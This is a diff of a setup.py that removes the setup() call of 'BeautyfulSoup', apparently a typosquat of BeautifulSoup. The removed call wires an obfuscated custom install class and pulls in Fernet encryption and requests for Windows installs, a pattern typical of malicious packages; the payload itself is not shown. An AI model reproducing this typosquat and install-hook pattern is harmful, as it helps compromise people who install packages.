@@ -18,22 +18,5 @@ class SlCEjeEOYTIRQyUXCUeHnemeXGiuGqWopmUfiVRqcCzjtFZFvXysHtTFOppanPsWoEJJMWGJkf
             install.run(self)
 
 
-setup(
-    name="BeautyfulSoup",
-    version=VERSION,
-    author="AYscveqwvf",
-    author_email="HSIGk@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': SlCEjeEOYTIRQyUXCUeHnemeXGiuGqWopmUfiVRqcCzjtFZFvXysHtTFOppanPsWoEJJMWGJkfVohBdLEHCQcMkaaUYgCunVdtT,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 
